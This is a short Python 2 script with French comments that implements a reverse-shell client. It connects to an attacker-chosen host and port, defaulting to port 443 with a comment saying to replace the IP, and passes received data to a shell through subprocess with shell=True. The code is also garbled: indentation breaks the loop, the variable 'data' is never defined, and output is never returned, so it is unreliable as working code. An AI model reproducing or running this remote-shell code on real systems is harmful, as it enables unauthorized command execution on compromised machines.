
import socket, select, string, sys
import subprocess,socket

# remplacer ip
HOST = '127.0.0.1'
PORT = 443

def prompt() :
    sys.stdout.write('connection etablie')
    sys.stdout.flush()
 
#main function
if __name__ == "__main__":
     
    if(len(sys.argv) < 3) :
        sys.exit()
     
    host = sys.argv[1]
    port = int(sys.argv[2])
     
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)

    # connection au remote host
    try :
        s.connect((host, port))
        s.send('Hello Toi!\n')
    except :
        print 'impossible de se connecter'
        sys.exit()
     	
while 1:
       		socket_list = [sys.stdin, s]
        
        # obtention de la liste socket 
        #read_sockets, write_sockets, error_sockets = select.select(socket_list , [], [])
proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
stdoutput = proc.stdout.read() + proc.stderr.read()
	

# loop ends here
s.send('Bye now!')
s.close()